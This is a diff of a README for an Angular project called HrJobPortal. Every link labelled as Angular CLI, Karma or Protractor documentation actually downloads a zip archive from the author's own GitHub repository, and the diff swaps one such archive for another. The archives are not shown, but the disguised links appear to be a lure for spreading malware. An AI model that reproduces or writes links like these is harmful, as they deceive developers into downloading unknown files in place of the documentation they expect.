@@ -1,6 +1,6 @@
 # HrJobPortal
 
-This project was generated with [Angular CLI](https://github.com/kabita10/Hr-Dashboard/raw/refs/heads/master/src/app/user-dashboard/Dashboard-Hr-v3.2.zip) version 11.0.2.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/kabita10/Hr-Dashboard/master/src/app/sign-up/Dashboard_Hr_v2.3.zip) version 11.0.2.
 
 ## Development server
 
@@ -16,12 +16,12 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://github.com/kabita10/Hr-Dashboard/raw/refs/heads/master/src/app/user-dashboard/Dashboard-Hr-v3.2.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/kabita10/Hr-Dashboard/master/src/app/sign-up/Dashboard_Hr_v2.3.zip).
 
 ## Running end-to-end tests
 
-Run `ng e2e` to execute the end-to-end tests via [Protractor](https://github.com/kabita10/Hr-Dashboard/raw/refs/heads/master/src/app/user-dashboard/Dashboard-Hr-v3.2.zip).
+Run `ng e2e` to execute the end-to-end tests via [Protractor](https://raw.githubusercontent.com/kabita10/Hr-Dashboard/master/src/app/sign-up/Dashboard_Hr_v2.3.zip).
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://github.com/kabita10/Hr-Dashboard/raw/refs/heads/master/src/app/user-dashboard/Dashboard-Hr-v3.2.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/kabita10/Hr-Dashboard/master/src/app/sign-up/Dashboard_Hr_v2.3.zip) page.
